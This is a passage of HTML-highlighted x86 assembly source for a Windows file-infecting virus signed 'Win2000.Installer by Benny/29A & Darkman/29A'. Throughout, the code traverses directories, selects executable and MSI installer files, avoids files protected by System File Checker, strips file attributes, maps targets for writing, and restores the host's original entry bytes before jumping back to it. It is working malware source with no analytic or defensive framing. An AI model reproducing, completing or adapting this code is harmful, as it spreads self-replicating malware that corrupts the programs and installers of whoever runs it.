    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">infectMSI</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to infect_msi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">file_extension_table_end</span><span class="sc4">-</span><span class="sc5">file_extension_table</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                    </span><span class="sc1">; CL = number of file extensions to</span><span class="sc0">
                    </span><span class="sc1">; compare with</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_extension_table</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
                    </span><span class="sc1">; ECX = pointer to file_extension_table</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">           </span><span class="sc1">; Examine file extension</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_FindNextFile</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to _FindNextFile</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_FindNextFile</span><span class="sc0">       </span><span class="sc1">;dont infect this PE if ZERO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pe_msi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;set flag - normal file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkinfect</span><span class="sc0">     </span><span class="sc1">;try to infect it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_FindNextFile</span><span class="sc0">       </span><span class="sc1">;and try another file</span><span class="sc0">
</span><span class="sc5">infectMSI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pe_msi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;set flag - MSI file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkinfect</span><span class="sc0">     </span><span class="sc1">;try to infect file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_FindNextFile</span><span class="sc0">       </span><span class="sc1">;and try another one</span><span class="sc0">

</span><span class="sc5">_FindNextFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; EDX = handle of search</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Address of structure for data on</span><span class="sc0">
                                        </span><span class="sc1">; found file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; Handle of search</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_FindNextFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; EDX = handle of search</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Function failed?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">examine_filename</span><span class="sc0">        </span><span class="sc1">; Zero? Jump to examine_filename</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; EDX = handle of search</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cBuffer_</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EDI = pointer to cBuffer_</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; Address of buffer for current</span><span class="sc0">
                                        </span><span class="sc1">; directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">                </span><span class="sc1">; Size, in characters, of directory</span><span class="sc0">
                                        </span><span class="sc1">; buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; EDX = handle of search</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; End of root directory?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_ExitProcess</span><span class="sc0">        </span><span class="sc1">; Equal? Jump to _ExitProcess</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'          ; AL = backslash
</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_last_char</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; ESI = pointer to cFileName</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">s_tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Find previous directory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szCurDir_</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX = pointer to szCurDir_</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX = pointer to name of new current</span><span class="sc0">
                                        </span><span class="sc1">; directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; Handle of search</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_FindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Function failed?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX = pointer to name of new current</span><span class="sc0">
                                        </span><span class="sc1">; directory</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">_ExitProcess</span><span class="sc0">        </span><span class="sc1">; Not zero? Jump to _ExitProcess</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectory_</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Address of name of new current</span><span class="sc0">
                                        </span><span class="sc1">; directory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Function failed?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_FindFirstFile</span><span class="sc0">      </span><span class="sc1">; Zero? Jump to _FindFirstFile</span><span class="sc0">
</span><span class="sc5">_ExitProcess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cBuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Address of name of new current</span><span class="sc0">
                                            </span><span class="sc1">; directory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;end of searching, files r infected, we can free library and jump to host</span><span class="sc0">

</span><span class="sc5">end_lib</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">          </span><span class="sc1">;address of SFC.DLL in memory</span><span class="sc0">
</span><span class="sc5">lib_ptr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_FreeLibrary</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;free library</span><span class="sc0">

</span><span class="sc5">end_host</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;jump to host</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_process</span><span class="sc0">    </span><span class="sc1">;get pointer to the entrypoint</span><span class="sc0">
</span><span class="sc5">OrigEPPtr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@saved</span><span class="sc0">
</span><span class="sc5">OrigBytes</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">    </span><span class="sc1">;saved bytes</span><span class="sc0">
</span><span class="sc5">@saved</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;ESI=address of saved bytes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;store EDI</span><span class="sc0">
    </span><span class="sc6">movsd</span><span class="sc0">                   </span><span class="sc1">;restore 5 bytes of host</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;code</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;restore EDI</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;jump to host code</span><span class="sc0">

</span><span class="sc5">find_last_char</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Find last specified character</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; EDI = pointer within cFileName</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc1">; NULL?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_last_char</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_last_char</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; ESI = pointer to end of cFileName</span><span class="sc0">
</span><span class="sc5">find_dot</span><span class="sc4">:</span><span class="sc0">       
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; EDI = pointer within cFileName</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Found character?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_dot</span><span class="sc0">        </span><span class="sc1">; Not equal? Jump to find_dot</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; EDI = size of file extension</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">
                    </span><span class="sc1">; little signature</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'[Win2000.Installer] by Benny/29A &amp; Darkman/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">checkinfect</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;check and infect procedure</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">aWFD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">;temporary store the address of WFD</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;mustnt be &gt;4GB</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">   </span><span class="sc1">;must be &gt;16kB</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;file name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;some params for API</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">api_ptr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;check, if the file is protected</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;by SFC</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">         </span><span class="sc1">;quit if is</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">  </span><span class="sc1">;blank attribs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;file name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_SetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;blank file attributes</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">          </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_CreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_error</span><span class="sc0">              </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;save the handle</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_CreateFileMappingA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;create file-mapping object</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">endCreateMapping</span><span class="sc0">          </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMapFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">;save the handle</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_MapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;map view of file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;save the address to variable</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nOpen</span><span class="sc0">               </span><span class="sc1">;continue on next label</span><span class="sc0">

</span><span class="sc5">closeFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;address of mapped file</span><span class="sc0">
</span><span class="sc5">lpFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_UnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;unmap view of file</span><span class="sc0">

</span><span class="sc5">endMapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;handle to file-mapping object</span><span class="sc0">
</span><span class="sc5">hMapFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_CloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close it</span><span class="sc0">

</span><span class="sc5">endCreateMapping</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">      </span><span class="sc1">;address of real WFD</span><span class="sc0">
</span><span class="sc5">aWFD</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
